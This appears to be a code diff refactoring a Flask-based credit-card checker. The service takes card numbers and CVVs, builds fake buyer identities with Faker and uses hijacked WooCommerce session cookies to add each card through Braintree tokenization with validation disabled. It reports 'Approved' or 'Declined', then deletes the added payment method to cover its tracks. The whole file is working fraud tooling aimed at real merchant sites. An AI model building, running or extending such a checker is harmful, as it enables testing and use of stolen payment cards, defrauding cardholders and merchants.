@@ -1,15 +1,16 @@
-import random
-import re
-import logging
-from urllib.parse import urlparse
 import requests
-from faker import Faker
-from lxml import html
-from flask import Flask, request, jsonify
-from functools import wraps
-from datetime import datetime, timedelta
-import time
+import re
 import json
+import random
+import logging
+from flask import Flask, request, jsonify
+import time
+from lxml import html
+import json
+from urllib.parse import urlparse
+from datetime import datetime, timedelta
+from faker import Faker
+from functools import wraps
 
 app = Flask(__name__)
 
@@ -18,6 +19,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
+
 logger = logging.getLogger(__name__)
 
 # Response messages
@@ -26,7 +28,7 @@ DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
 ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'
 
 # Configuration
-REQUEST_TIMEOUT = 15
+REQUEST_TIMEOUT = 60  # Increased from 15 to allow more time for external API calls
 CACHE_EXPIRY = timedelta(minutes=30)
 
 fake = Faker("en_US")
@@ -77,7 +79,7 @@ def fetch_city_zipcode_data():
     
     url = "https://raw.githubusercontent.com/ANYA-LZ/country-map/refs/heads/main/US.json"
     try:
-        response = requests.get(url, timeout=REQUEST_TIMEOUT)
+        response = requests.get(url, timeout=10)  # Reduced timeout for faster failure
         response.raise_for_status()
         geo_data = response.json()
         
@@ -87,7 +89,14 @@ def fetch_city_zipcode_data():
         return geo_data
     except requests.RequestException as e:
         logger.error(f"Failed to fetch geographic data: {str(e)}")
-        return None
+        # Return a fallback dataset to avoid complete failure
+        fallback_data = {
+            "CA": {"Los Angeles": "90210", "San Francisco": "94102"},
+            "NY": {"New York": "10001", "Albany": "12201"},
+            "TX": {"Houston": "77001", "Dallas": "75201"},
+            "FL": {"Miami": "33101", "Tampa": "33601"}
+        }
+        return fallback_data
 
 @validate_input
 def generate_random_person():
@@ -119,8 +128,108 @@ def _format_phone_number(zipcode):
     base_num = fake.numerify("###-###-####")
     return f"({zipcode[:3]}) {base_num}"
 
-@rate_limited(5)
-def get_woocommerce_secrets(cookies, random_person, url):
+def generate_cookies(gateway_config):
+    cookies_list = gateway_config.get("cookies", [])
+    cookies_dict = {}
+    for cookie in cookies_list:
+        if 'name' not in cookie or 'value' not in cookie:
+            logger.error("Invalid cookie format")
+            return ERROR, "Invalid cookie format"
+        cookies_dict[cookie["name"]] = cookie["value"]
+
+    return cookies_dict
+
+def create_new_session(gateway_config, random_person):
+    parsed_url = urlparse(gateway_config['url'])
+    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
+    """Create a new session with random data"""
+    session = requests.Session()
+
+    headers = {
+        'User-Agent': random_person['user_agent'],
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Cache-Control': 'max-age=0',
+        'Origin': origin,
+        'Referer': gateway_config['url'],
+    }
+    
+    # Update headers with random data
+    session.headers.update(headers)
+    
+    # Add random cookies to the session
+    session.cookies.update(generate_cookies(gateway_config))
+
+    return session
+
+class SessionManager:
+    """Manages separate sessions for each card number to prevent mixing between requests"""
+    
+    def __init__(self):
+        self.sessions = {}  # Dictionary to store card_number -> session mapping
+        self.session_timestamps = {}  # Track session creation time for cleanup
+        self.max_session_age = timedelta(minutes=1)  # Sessions expire after 1 minute
+
+    def get_session_key(self, card_number, gateway_url):
+        """Create a unique key for the session based on card number and gateway"""
+        return f"{card_number}_{gateway_url}"
+    
+    def get_session(self, card_number, gateway_config, random_person):
+        """Get or create a session for the specific card number"""
+        session_key = self.get_session_key(card_number, gateway_config['url'])
+        
+        # Clean up old sessions first
+        self._cleanup_old_sessions()
+        
+        # Check if we already have a session for this card
+        if session_key not in self.sessions:
+            self.sessions[session_key] = create_new_session(gateway_config, random_person)
+            self.session_timestamps[session_key] = datetime.now()
+        else:
+            pass # Reuse existing session
+        
+        session = self.sessions[session_key]
+        return session
+    
+    def cleanup_session(self, card_number, gateway_url):
+        """Remove a specific session from memory"""
+        session_key = self.get_session_key(card_number, gateway_url)
+        if session_key in self.sessions:
+            self.sessions[session_key].close()  # Close the session properly
+            del self.sessions[session_key]
+            if session_key in self.session_timestamps:
+                del self.session_timestamps[session_key]
+    
+    def _cleanup_old_sessions(self):
+        """Remove sessions that are older than max_session_age"""
+        current_time = datetime.now()
+        sessions_to_remove = []
+        
+        for session_key, timestamp in self.session_timestamps.items():
+            if current_time - timestamp > self.max_session_age:
+                sessions_to_remove.append(session_key)
+        
+        for session_key in sessions_to_remove:
+            logger.info(f"Removing expired session: {session_key}")
+            if session_key in self.sessions:
+                self.sessions[session_key].close()
+                del self.sessions[session_key]
+            del self.session_timestamps[session_key]
+
+# Global session manager instance
+session_manager = SessionManager()
+
+def get_session(card_number, gateway_config, random_person):
+    """Get a session specific to the card number to prevent mixing between requests"""
+    return session_manager.get_session(card_number, gateway_config, random_person)
+
+def extract_payment_config(card_number, random_person, gateway_config, session=None):
     result = {
         'nonce': None,
         'pk_live': None,
@@ -130,24 +239,14 @@ def get_woocommerce_secrets(cookies, random_person, url):
     }
     
     try:
-        parsed_url = urlparse(url)
-        origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
-        
-        headers = {
-            'User-Agent': random_person['user_agent'],
-            'Origin': origin,
-            'Referer': url,
-        }
-        
-        with requests.Session() as session:
-            session.headers.update(headers)
-            response = session.post(
-                url,
-                data={'_wc_user_reg': 'true'},
-                cookies=cookies,
-                timeout=10
-            )
-            response.raise_for_status()
+        session = session or get_session(card_number, gateway_config, random_person)
+        response = session.post(
+            gateway_config['url'],
+            data={'_wc_user_reg': 'true'},
+            timeout=REQUEST_TIMEOUT
+        )
+        response.raise_for_status()
+        session.cookies.update(response.cookies)
 
         # 1. Extract NONCE from HTML
         tree = html.fromstring(response.content)
@@ -176,57 +275,6 @@ def get_woocommerce_secrets(cookies, random_person, url):
     except Exception as e:
         logging.error(f"Unexpected error: {str(e)}")
         return result
-
-def delete_payment_method(cookies, random_person, url):
-    """Execute payment method deletion and return success status"""
-    try:
-        headers = {
-            'User-Agent': random_person['user_agent'],
-            'Referer': url,
-        }
-        
-        with requests.Session() as session:
-            session.headers.update(headers)
-            
-            # Get account page to find delete URL
-            account_response = session.get(
-                url,
-                cookies=cookies,
-                timeout=REQUEST_TIMEOUT
-            )
-            account_response.raise_for_status()
-            
-            tree = html.fromstring(account_response.content)
-            delete_url = tree.xpath(
-                '//td[contains(@class, "payment-method-actions")]'
-                '//a[contains(@class, "delete")]/@href'
-            )
-            
-            if not delete_url:
-                logger.warning("Delete URL not found")
-                return False
-                
-            # Execute deletion
-            delete_response = session.get(
-                delete_url[0],
-                cookies=cookies,
-                allow_redirects=True,
-                timeout=REQUEST_TIMEOUT
-            )
-            delete_response.raise_for_status()
-            
-            return "Payment method deleted" in delete_response.text
-            
-    except requests.RequestException as e:
-        logger.error(f"Request failed in delete_payment_method: {str(e)}")
-        return False
-    except Exception as e:
-        logger.error(f"Unexpected error in delete_payment_method: {str(e)}")
-        return False
-    
-def format_credit_card(number):
-    cleaned = ''.join(filter(str.isdigit, str(number)))
-    return ' '.join(cleaned[i:i+4] for i in range(0, len(cleaned), 4))
     
 @validate_input
 def get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, url):
@@ -298,9 +346,9 @@ def get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, url)
     except (KeyError, ValueError) as e:
         logger.error(f"Invalid response data: {str(e)}")
         return False
-
+    
 @validate_input
-def get_bar_auth_token(card_info, random_person, access_token):
+def get_bar_auth_token(payload, card_info, random_person, access_token):
     """Generate payment token through Braintree API"""
     
     if not isinstance(random_person, dict) or 'zipcode' not in random_person:
@@ -313,62 +361,11 @@ def get_bar_auth_token(card_info, random_person, access_token):
         'Content-Type': 'application/json',
     }
 
-    payload_v2 = {
-        "clientSdkMetadata": {
-            "source": "client",
-            "integration": "custom",
-            "sessionId": fake.uuid4()
-        },
-        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-        "variables": {
-            "input": {
-            "creditCard": {
-                "number": card_info['number'],
-                "expirationMonth": card_info['month'],
-                "expirationYear": card_info['year'],
-                "cvv": card_info['cvv'],
-                "billingAddress": {
-                "postalCode": random_person['zipcode'],
-                "streetAddress": ""
-                }
-            },
-            "options": {
-                "validate": False
-            }
-            }
-        },
-        "operationName": "TokenizeCreditCard"
-    }
-
-    payload_v1 = {
-        "clientSdkMetadata": {
-            "source": "client",
-            "integration": "custom",
-            "sessionId": fake.uuid4()
-        },
-        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-        "variables": {
-            "input": {
-            "creditCard": {
-                "number": card_info['number'],
-                "expirationMonth": card_info['month'],
-                "expirationYear": card_info['year'],
-                "cvv": card_info['cvv']
-            },
-            "options": {
-                "validate": False
-            }
-            }
-        },
-        "operationName": "TokenizeCreditCard"
-    }
-
-
     try:
         response = requests.post(
             'https://payments.braintree-api.com/graphql',
             headers=headers,
-            json=payload_v1,
+            json=payload,
             timeout=REQUEST_TIMEOUT
         )
         response.raise_for_status()
@@ -390,7 +387,7 @@ def get_bar_auth_token(card_info, random_person, access_token):
     except (KeyError, ValueError) as e:
         logger.error(f"Invalid response data: {str(e)}")
         return None, None
-    
+
 def get_payload_bar_auth_info_v2(auth_token):
 
     url = "https://payments.braintree-api.com/graphql"
@@ -418,7 +415,7 @@ def get_payload_bar_auth_info_v2(auth_token):
             url,
             json=payload,
             headers=headers,
-            timeout=10
+            timeout=15  # Increased from 10 to 15 seconds
         )
 
         # Check for HTTP errors
@@ -442,28 +439,52 @@ def get_payload_bar_auth_info_v2(auth_token):
     except ValueError as e:
         print(f"Invalid response data: {str(e)}")
         return None
-    
-def generate_payload_payment(random_person, gateway_config, card_info, cookies):
-    secrets = get_woocommerce_secrets(cookies, random_person, gateway_config['url'])
+
+def generate_payload_payment(card_number, random_person, gateway_config, card_info, session=None):
+    secrets = extract_payment_config(card_number, random_person, gateway_config, session=session)
 
     # Corrected the typo from 'gataway_type' to 'gateway_type'
     if "Braintree Auth" in gateway_config['gateway_type']:
-        token, brandCode = get_bar_auth_token(
-            card_info,
-            random_person,
-            gateway_config["access_token"]
-        )
-
-        if not token or not brandCode:
-            logger.error("Failed to get token or brand code")
-            return False, "Failed to fetch token or brand code"
         
         if "v1_with_cookies" in gateway_config['version']:
             if not (nonce := secrets.get('nonce')):
                 logger.error("Failed to fetch nonce")
                 return False, "Failed to fetch nonce"
             
-            # Fixed duplicate wc_braintree_device_data key
+            payload_auth = {
+                "clientSdkMetadata": {
+                    "source": "client",
+                    "integration": "custom",
+                    "sessionId": fake.uuid4()
+                },
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+                "variables": {
+                    "input": {
+                    "creditCard": {
+                        "number": card_info['number'],
+                        "expirationMonth": card_info['month'],
+                        "expirationYear": card_info['year'],
+                        "cvv": card_info['cvv']
+                    },
+                    "options": {
+                        "validate": False
+                    }
+                    }
+                },
+                "operationName": "TokenizeCreditCard"
+            }
+            
+            token, brandCode = get_bar_auth_token(
+                payload_auth,
+                card_info,
+                random_person,
+                gateway_config["access_token"]
+            )
+
+            if not token or not brandCode:
+                logger.error("Failed to get token or brand code")
+                return False, "Failed to fetch token or brand code"
+            
             payload = {
                 'payment_method': "braintree_credit_card",
                 'wc-braintree-credit-card-card-type': brandCode,
@@ -478,7 +499,45 @@ def generate_payload_payment(random_person, gateway_config, card_info, cookies):
                 'woocommerce_add_payment_method': "1"
             }
         
-        elif "v2_with_cookies" in gateway_config['version']:
+        elif "v3_with_cookies" in gateway_config['version']:
+            payload_auth = {
+                "clientSdkMetadata": {
+                    "source": "client",
+                    "integration": "custom",
+                    "sessionId": fake.uuid4()
+                },
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+                "variables": {
+                    "input": {
+                    "creditCard": {
+                        "number": card_info['number'],
+                        "expirationMonth": card_info['month'],
+                        "expirationYear": card_info['year'],
+                        "cvv": card_info['cvv'],
+                        "billingAddress": {
+                        "postalCode": random_person['zipcode'],
+                        "streetAddress": ""
+                        }
+                    },
+                    "options": {
+                        "validate": False
+                    }
+                    }
+                },
+                "operationName": "TokenizeCreditCard"
+            }
+            
+            token, brandCode = get_bar_auth_token(
+                payload_auth,
+                card_info,
+                random_person,
+                gateway_config["access_token"]
+            )
+
+            if not token or not brandCode:
+                logger.error("Failed to get token or brand code")
+                return False, "Failed to fetch token or brand code"
+            
             payload_config = get_payload_bar_auth_info_v2(gateway_config["access_token"])
             if not payload_config:
                 logger.error("Failed to get Braintree Auth payload info v2")
@@ -550,54 +609,50 @@ def generate_payload_payment(random_person, gateway_config, card_info, cookies):
         return False, f"Unsupported gateway type: {gateway_config['gateway_type']}"
 
     return True, payload
-    
-def process_payment(random_person, gateway_config, card_info):
-    """Execute payment processing through WooCommerce endpoint"""
-    parsed_url = urlparse(gateway_config["url"])
-    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
 
-    # Validate cookies
-    cookies_list = gateway_config.get("cookies", [])
-    if not cookies_list:
-        logger.error("No cookies provided")
-        return ERROR, "Cookies are missing in gateway config"
-    
-    cookies_dict = {}
-    for cookie in cookies_list:
-        if 'name' not in cookie or 'value' not in cookie:
-            logger.error("Invalid cookie format")
-            return ERROR, "Invalid cookie format"
-        cookies_dict[cookie["name"]] = cookie["value"]
-
-    status, result = generate_payload_payment(random_person, gateway_config, card_info, cookies_dict)
-    if not status:
-        return ERROR, result
-    
-    payload = result
-    
-    headers = {
-        'User-Agent': random_person['user_agent'],
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': origin,
-        'Referer': gateway_config["url"],
-    }
-
+def delete_payment_method(card_number, gateway_config, random_person, url, session=None):
+    """Execute payment method deletion and return success status"""
     try:
-        response = requests.post(
-            url=gateway_config["post_url"],
-            headers=headers,
-            cookies=cookies_dict,
-            data=payload,
+
+        session = session or get_session(card_number, gateway_config, random_person)
+        account_response = session.post(
+            url=url,
+            allow_redirects=True,
             timeout=REQUEST_TIMEOUT
         )
-        return _parse_payment_response(response.content, cookies_dict, random_person, gateway_config["success_message"], gateway_config["error_message"], origin)
-    except requests.RequestException as e:
-        logger.error(f"Payment request failed: {str(e)}")
-        return ERROR, f"Request failed: {str(e)}"
+        account_response.raise_for_status()
+        session.cookies.update(account_response.cookies)
 
-def _parse_payment_response(content, cookies, random_person, success_xpath, error_xpath, origin):
+        tree = html.fromstring(account_response.content)
+
+        # Extract delete URL
+        delete_links = tree.xpath('//a[contains(concat(" ", normalize-space(@class), " "), " delete ")]/@href')
+
+        if not delete_links:
+            logger.warning("No delete link found on account page")
+            return False
+
+        delete_url = delete_links[0]
+
+        session = session or get_session(card_number, gateway_config, random_person)
+        delete_response = session.post(
+            url=delete_url,
+            allow_redirects=True,
+            timeout=REQUEST_TIMEOUT
+        )
+        delete_response.raise_for_status()
+        session.cookies.update(account_response.cookies)
+        
+        return "Payment method deleted" in delete_response.text
+            
+    except requests.RequestException as e:
+        logger.error(f"Request failed in delete_payment_method: {str(e)}")
+        return False
+    except Exception as e:
+        logger.error(f"Unexpected error in delete_payment_method: {str(e)}")
+        return False
+
+def _parse_payment_response(card_number, content, random_person, gateway_config, session=None):
     """Parse and interpret payment gateway response (HTML or JSON)"""
     try:
         # First try to parse as JSON
@@ -618,12 +673,15 @@ def _parse_payment_response(content, cookies, random_person, success_xpath, erro
             # If not JSON, parse as HTML
             tree = html.fromstring(content)
             extracted_message = "Unknown response"
-
+            success_xpath = gateway_config['success_message']
+            error_xpath = gateway_config['error_message']
+            parsed_url = urlparse(gateway_config['url'])
+            origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
             # Check for success in HTML
             success = tree.xpath(success_xpath)
             if success:
                 message = 'Approved'
-                if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
+                if not delete_payment_method(card_number, gateway_config, random_person, f"{origin}/my-account/payment-methods/", session):
                     message = 'Approved (error delete)'
                 return APPROVED, message
 
@@ -636,7 +694,7 @@ def _parse_payment_response(content, cookies, random_person, success_xpath, erro
                 
                 if "Duplicate card exists in the vault" in extracted_message:
                     extracted_message = 'Approved old try again'
-                    if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
+                    if not delete_payment_method(card_number, gateway_config, random_person, f"{origin}/my-account/payment-methods/", session):
                         extracted_message = 'Approved old try again (error delete)'
                     return APPROVED, extracted_message
 
@@ -649,6 +707,40 @@ def _parse_payment_response(content, cookies, random_person, success_xpath, erro
     except Exception as e:
         logger.error(f"Response parsing failed: {str(e)}")
         return ERROR, f"Parsing failed: {str(e)}"
+
+
+def process_payment(gateway_config, card_info, random_person, session=None):
+
+    card_number = card_info['number']
+    status, result = generate_payload_payment(card_number, random_person, gateway_config, card_info, session)
+    if not status:
+        return ERROR, result
+    
+    payload = result
+
+    try:
+        session = session or get_session(card_number, gateway_config, random_person)
+        response = session.post(
+            url=gateway_config["post_url"],
+            data=payload,
+            allow_redirects=True,
+            timeout=REQUEST_TIMEOUT
+        )
+        session.cookies.update(response.cookies)
+        
+        # Parse response and clean up session after processing
+        status, message = _parse_payment_response(card_number, response.content, random_person, gateway_config, session)
+        
+        # Clean up the session for this card to free memory
+        session_manager.cleanup_session(card_number, gateway_config['url'])
+        
+        return status, message
+        
+    except requests.RequestException as e:
+        logger.error(f"Payment request failed: {str(e)}")
+        # Clean up session on error as well
+        session_manager.cleanup_session(card_number, gateway_config['url'])
+        return ERROR, f"Request failed: {str(e)}"
 
 @app.route('/')
 def index():
@@ -689,20 +781,24 @@ def handle_payment():
                 logger.error(f"Missing required card field: {field}")
                 return jsonify({"status": ERROR, "result": f"{field} is missing in card info"}), 400
         
+        # Log card identification for debugging (only last 4 digits)
+        card_number = card_info['number']
+        logger.info(f"Processing payment for card ending in: {card_number[-4:]}")
+            
         # Generate random person profile
         random_person = generate_random_person()
         if not random_person:
             logger.error("Failed to generate random person profile")
             return jsonify({"status": ERROR, "result": "Failed to generate random person"}), 400
-        
-        # Process payment
+            
+        # Process payment with card-specific session
         status, result = process_payment(
-            random_person,
             gateway_config,
-            card_info
+            card_info,
+            random_person
         )
         
-        logger.info(f"Payment processed - Status: {status}, Result: {result}")
+        logger.info(f"Payment processed for card ending in {card_number[-4:]} - Status: {status}, Result: {result}")
         logger.info(f"Request processing time: {time.time() - start_time:.2f} seconds")
 
         if ERROR in status:
@@ -726,3 +822,4 @@ def handle_payment():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
+    
